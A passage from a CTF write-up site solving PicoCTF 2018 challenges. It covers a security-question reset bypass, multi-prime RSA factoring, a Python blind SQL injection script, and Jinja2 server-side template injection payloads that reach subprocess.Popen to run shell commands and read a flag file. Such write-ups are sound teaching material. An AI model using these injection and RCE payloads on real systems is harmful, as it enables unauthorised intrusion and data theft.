<span class="c">&lt;!--Proudly maintained by pendleton --&gt;</span>

  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/section&gt;</span>
[..]
</pre></table></code></div></div><p>So we guess that this user also has an account on the website, and this turns out to be correct. Now that we have a username,<br /> we can enter this into the “forgot password” menu. We are now presented with a series of security questions,</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>What is your favorite carmake?
What is your favorite food?
What is your favorite color?
Who is your favorite hero?
</pre></table></code></div></div><p>After three wrong answers you are locked out of the account (until you clear cookies). It would be too much work to<br /> guess all of these answers, even if we do get unlimited tries. we also notice that if we refresh the page before answering,<br /> it will give us another one of these questions randomly. So if we can guess one answer, we can refresh until we get the same<br /> question, and repeat that until we have answered 4 questions.</p><p>Color seems like the easiest to guess, and indeed, it doesn’t take us long to find out that <code class="language-plaintext highlighter-rouge">blue</code> is the correct answer for<br /> this user. So we refresh questions until we are asked for our fav colour, answer the same questioni 4 times and then we are<br /> able to reset our password. Once we log into the account with the new password, we get the flag:</p><p><img src="writeupfiles/helpmereset_flag.png" alt="" /></p><p>Fun fact: since the profile page was completely unauth’d, googling the url of the challenge also led us to the flag:</p><p><img src="writeupfiles/helpmereset_google.jpg" alt="" /></p><h2> Flag</h2><code> picoCTF{i_thought_i_could_remember_those_34745314} </code><hr><h1 id="super-safe-rsa-3"> Super Safe RSA 3 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/88-crypto-600-super-safe-rsa-3.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The more primes, the safer.. right.?.? Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 54915</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We connect and get a set of RSA parameters:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>c: 798969532868241034262201660820334428498697405198819266351660979640918089698370850085963580823359953106591774105288828682672867652949613335290035360447893613465055031850950614550860391928155270420985614349302804909553389682874636771202896787415532131111854204772669056806821882162359339598288501623562730
n: 3541776961350756146796799821164868207619475719115743434366890478881578624044753627501375811206039117157906709552318526962375639546716015765226846022541932426874729631398855600887631313842537323018023929885623095650914457879588746735283232366011283028664737579701177211757369241731005141006276936915308803
e: 65537
</pre></table></code></div></div><p>Based on the description this probably uses multi-prime RSA. This is identical to regular RSA except for the computation of the totient, which becomes</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>r = (p1-1) * (p2 - 1) * .. * (pn -1)
</pre></table></code></div></div><p>There is nothing wrong with using multiple primes, except when they become too small. We try to brute force the prime factors to find our flag:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">gmpy2</span>
<span class="kn">import</span> <span class="n">primefac</span>


<span class="n">c</span> <span class="o">=</span> <span class="mi">798969532868241034262201660820334428498697405198819266351660979640918089698370850085963580823359953106591774105288828682672867652949613335290035360447893613465055031850950614550860391928155270420985614349302804909553389682874636771202896787415532131111854204772669056806821882162359339598288501623562730</span>
<span class="n">n</span> <span class="o">=</span> <span class="mi">3541776961350756146796799821164868207619475719115743434366890478881578624044753627501375811206039117157906709552318526962375639546716015765226846022541932426874729631398855600887631313842537323018023929885623095650914457879588746735283232366011283028664737579701177211757369241731005141006276936915308803</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>

<span class="c1"># find the prime factors
</span><span class="n">primes</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">primefac</span><span class="p">.</span><span class="nf">primefac</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>

<span class="c1"># compute totient
</span><span class="n">r</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">primes</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">*=</span> <span class="n">p</span><span class="o">-</span><span class="mi">1</span>

<span class="c1"># decrypt
</span><span class="n">d</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">divm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
<span class="n">m</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">powmod</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>

<span class="c1"># print flag
</span><span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">((</span><span class="n">m</span> <span class="o">&gt;&gt;</span> <span class="n">j</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">reversed</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">))]))</span>
</pre></table></code></div></div><p>which prints our flag.</p><h2> Flag</h2><code> picoCTF{p_&_q_n0_r_$_t!!_6629910} </code><hr><h1 id="special-pw"> special-pw <a href="/CTF-writeups-public/writeups/PicoCTF_2018/89-reversing-600-special-pw.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> Can you figure out the right argument to this program to login? We couldn’t manage to get a copy of the binary but we did manage to <a href="writeupfiles/special_pw.S">dump</a> some machine code and memory from the running process.</p><p><strong>Hints</strong> Hmmm maybe if we do the reverse of each operation we can get the password?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="a-simple-question"> A Simple Question <a href="/CTF-writeups-public/writeups/PicoCTF_2018/90-web-exploitation-650-a-simple-question.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There is a website running at http://2018shell1.picoctf.com:36052 (link). Try to see if you can answer its question.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>we get a form looking for an answer</p><p><img src="writeupfiles/simplequestion.png" alt="" /></p><p>if we enter a value of <code class="language-plaintext highlighter-rouge">a</code> we are given the SQL statement constructed and message that we were wrong.</p><p><img src="writeupfiles/simplequestion_wrong.png" alt="" /></p><p>Let’s see what happens when we enter <code class="language-plaintext highlighter-rouge">' or 'x'='x</code></p><p><img src="writeupfiles/simplequestion_close.png" alt="" /></p><p>ok, so we get a different message if the query returns something, this we can use. We can give an snwer like <code class="language-plaintext highlighter-rouge">' OR answer LIKE 'a%</code> to test if it starts with a letter a, and build up answer like that. Since this will takea while, we script it</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">string</span>

<span class="n">url</span><span class="o">=</span><span class="sh">"</span><span class="s">http://2018shell1.picoctf.com:36052/answer2.php</span><span class="sh">"</span>
<span class="n">alphabet</span><span class="o">=</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">%</span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"'"</span><span class="p">,</span><span class="sh">''</span><span class="p">)</span>
<span class="n">password</span><span class="o">=</span><span class="sh">''</span>

<span class="n">stop</span> <span class="o">=</span> <span class="bp">False</span>
<span class="k">while</span> <span class="ow">not</span> <span class="n">stop</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">answer</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"'</span><span class="s"> OR answer LIKE </span><span class="sh">'"</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="sh">"</span><span class="s">%</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>

        <span class="k">if</span> <span class="sh">"</span><span class="s">so close</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">letter found! </span><span class="sh">"</span><span class="o">+</span><span class="n">password</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="k">elif</span> <span class="sh">"</span><span class="s">Wrong</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">stop</span> <span class="o">=</span> <span class="bp">True</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
            <span class="k">break</span>

<span class="nf">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</pre></table></code></div></div><p>this outputs</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>letter found! 4
letter found! 41
letter found! 41a
letter found! 41an
letter found! 41and
letter found! 41ands
letter found! 41andsi
letter found! 41andsix
letter found! 41andsixs
letter found! 41andsixsi
letter found! 41andsixsix
letter found! 41andsixsixt
letter found! 41andsixsixth
letter found! 41andsixsixths
</pre></table></code></div></div><p>but now what..? this is not the flag, nor the answer to put in the form. Nor is <code class="language-plaintext highlighter-rouge">42</code></p><p>turns out the query wasn’t case sensitive, and the answer we are looking for is <code class="language-plaintext highlighter-rouge">41AndSixSixths</code>. When we put that in the form we get the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>SQL query: SELECT * FROM answers WHERE answer='41AndSixSixths'

Perfect!

Your flag is: picoCTF{qu3stions_ar3_h4rd_d3850719}
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{qu3stions_ar3_h4rd_d3850719} </code><hr><h1 id="cryptography-700-james-brahm-returns"> Cryptography 700: James Brahm Returns <a href="/CTF-writeups-public/writeups/PicoCTF_2018/91-cryptography-700-james-brahm-returns.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Dr. Xernon has finally approved an update to James Brahm’s spy terminal. (Someone finally told them that ECB isn’t secure.) Fortunately, CBC mode is safe! Right? Connect with nc 2018shell1.picoctf.com 15596. <a href="writeupfiles/james-brahm-returns.py">Source.</a></p><p><strong>Hints</strong> What killed SSL3?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote><p>In 2014, SSL 3.0 was found to be vulnerable to the <a href="https://en.wikipedia.org/wiki/POODLE">POODLE attack</a> that affects all block ciphers in SSL; RC4, the only non-block cipher supported by SSL 3.0, is also feasibly broken as used in SSL 3.0.[17]</p></blockquote><h2> Flag</h2><code> unsolved </code><hr><h1 id="lambdash-3"> LambDash 3 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/92-web-exploitation-800-lambdash-3.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>C? Who uses that anymore. If we really want to be secure, we should all start learning lambda calculus. http://2018shell1.picoctf.com:43607 (link)</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="dog-or-frog"> Dog or Frog <a href="/CTF-writeups-public/writeups/PicoCTF_2018/93-general-skills-900-dog-or-frog.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Dressing up dogs are kinda the new thing, see if you can get this lovely girl ready for her costume party.</p><p><a href="http://2018shell1.picoctf.com:18466/">Dog Or Frog</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="flaskcards-and-freedom"> Flaskcards and Freedom <a href="/CTF-writeups-public/writeups/PicoCTF_2018/94-web-exploitation-900-flaskcards-and-freedom.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There seem to be a few more files stored on the flash card server but we can’t login. Can you?</p><p>http://2018shell1.picoctf.com:56944</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Looks like we can do more advanced things with the SSTI vulnerability from the <a href="#">previous Flaskcard challenge</a></p><p>We find this great description about remote code execution (rce) through server side template injection (SSTI):</p><ul><li>https://www.lanmaster53.com/2016/03/09/exploring-ssti-flask-jinja2/<li>https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/</ul><p><em>Greatly simplified, <code class="language-plaintext highlighter-rouge">__mro__</code> allows us to go back up the tree of inherited objects in the current Python environment, and <code class="language-plaintext highlighter-rouge">__subclasses__</code> lets us come back down. So what’s the impact on the search of a greater exploit for SSTI in Flask/Jinja2? By starting with a new-type object, e.g. type str, we can crawl up the inheritance tree to the root object class using <code class="language-plaintext highlighter-rouge">__mro__</code>, then crawl back down to every new-style object in the Python environment using <code class="language-plaintext highlighter-rouge">__subclasses__</code>. Yes, this gives us access to every class loaded in the current python environment.</em></p><p>Let’s try it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>input: {{ ''.__class__.__mro__ }}

result: (&lt;class 'str'&gt;, &lt;class 'object'&gt;)
</pre></table></code></div></div><p>now, let’s try to access the <code class="language-plaintext highlighter-rouge">object</code> class and find all the subclasses loaded into the app:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>input: {{ ''.__class__.__mro__[1].__subclasses__() }}

result: [&lt;class 'itertools.compress'&gt;, &lt;class 'formatteriterator'&gt;,
&lt;class 'apt_pkg.ActionGroup'&gt;, &lt;class 'flask_wtf.csrf.CSRFProtect'&gt;,
&lt;class 'sqlalchemy.sql.naming.ConventionDict'&gt;, &lt;class 'sqlalchemy.util.langhelpers.PluginLoader'&gt;,
&lt;class 'werkzeug.formparser.MultiPartParser'&gt;, &lt;class 'werkzeug.wrappers.ResponseStream'&gt;,
&lt;class 'jinja2.utils.LRUCache'&gt;, &lt;class 'operator.methodcaller'&gt;, &lt;class 'code'&gt;,

[..] (~750 more classes)

&lt;class 'click.core.Parameter'&gt;, &lt;class 'wtforms.fields.core.Field'&gt;, &lt;class 'subprocess.Popen'&gt;,
&lt;class 'zipfile.LZMACompressor'&gt;, &lt;class 'itertools._tee'&gt;, &lt;class 'wtforms.validators.Regexp'&gt;,
&lt;class 'werkzeug.wsgi.DispatcherMiddleware'&gt;, &lt;class '_ctypes._CData'&gt;, &lt;class 'itertools.chain'&gt;]
</pre></table></code></div></div><p>Screenshot of how this looks on the website:</p><p><img src="writeupfiles/flaskcards_freedom_ss.png" alt="" /></p><p>So these are all the python classes we have access to, around 770 of them. Popen looks interesting, and we determine it is number 760 in the list:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>input: {{ ''.__class__.__mro__[1].__subclasses__()[760] }}

result: &lt;class 'subprocess.Popen'&gt;
</pre></table></code></div></div><p>Let’s try to run it, we’ll start with a simple <code class="language-plaintext highlighter-rouge">pwd</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>input: {{ ''.__class__.__mro__[1].__subclasses__()[760]('pwd',shell=True).communicate() }}
result: (None, None)
</pre></table></code></div></div><p>hmm, it is not outputting stdout; normally we would add <code class="language-plaintext highlighter-rouge">stdout=subprocess.PIPE</code>, but we don’t have access to <code class="language-plaintext highlighter-rouge">subprocess</code>, only <code class="language-plaintext highlighter-rouge">subprocess.Popen</code> is loaded, but this turns out to just be the integer <code class="language-plaintext highlighter-rouge">-1</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>input: {{ ''.__class__.__mro__[1].__subclasses__()[760]('pwd',shell=True,stdout=-1).communicate() }}
result: (b'/problems/flaskcards-and-freedom_4_2cd670d54e75a9ed7cd0e9b76816fc59\n', None)
</pre></table></code></div></div><p>yay! so we can run any shell command! Now to get the flag..</p><p>The challenge description mentioned there were files, so let’s do an <code class="language-plaintext highlighter-rouge">ls</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>input: {{ ''.__class__.__mro__[1].__subclasses__()[760]('ls',shell=True,stdout=-1).communicate() }}
result: (b'app\nflag\nserver.py\nxinet_startup.sh\n', None)
</pre></table></code></div></div><p>ok, looks like we need to read the file named <code class="language-plaintext highlighter-rouge">flag</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>input: {{ ''.__class__.__mro__[1].__subclasses__()[760]('cat flag',shell=True,stdout=-1).communicate() }}
result: (b'picoCTF{R_C_E_wont_let_me_be_85e92c3a}', None)
</pre></table></code></div></div><p><img src="writeupfiles/flaskcards_freedom_flag.png" alt="" /></p><p>whoo \o/</p><h2> Flag</h2><code> picoCTF{R_C_E_wont_let_me_be_85e92c3a} </code><hr></div><script> document.addEventListener("DOMContentLoaded", () => { console.log("Hello World!"); tocbot.init({ tocSelector: '#toc', contentSelector: '.post-content', ignoreSelector: '[data-toc-skip]', headingSelector: 'h1', orderedList: false, scrollSmooth: false, }); }); </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div class="panel-heading"> <a href="https://github.com/shiltemann/CTF-writeups-public/tree/main/website/writeups/PicoCTF_2018/index.md"><i class="fab fa-github"></i> Edit on GitHub </a></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/CTF-writeups-public/tag/image/">image</a> <a class="post-tag" href="/CTF-writeups-public/tag/rsa/">RSA</a> <a class="post-tag" href="/CTF-writeups-public/tag/lsb/">LSB</a> <a class="post-tag" href="/CTF-writeups-public/tag/cipher/">cipher</a> <a class="post-tag" href="/CTF-writeups-public/tag/pcap/">pcap</a> <a class="post-tag" href="/CTF-writeups-public/tag/audio/">audio</a> <a class="post-tag" href="/CTF-writeups-public/tag/aws/">aws</a> <a class="post-tag" href="/CTF-writeups-public/tag/bash/">bash</a> <a class="post-tag" href="/CTF-writeups-public/tag/binwalk/">binwalk</a> <a class="post-tag" href="/CTF-writeups-public/tag/crib-dragging/">crib dragging</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/shiltemann">Team Galaxians</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false" ><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/CTF-writeups-public/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script defer src="/CTF-writeups-public/assets/js/dist/commons.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/CTF-writeups-public/app.js"></script>
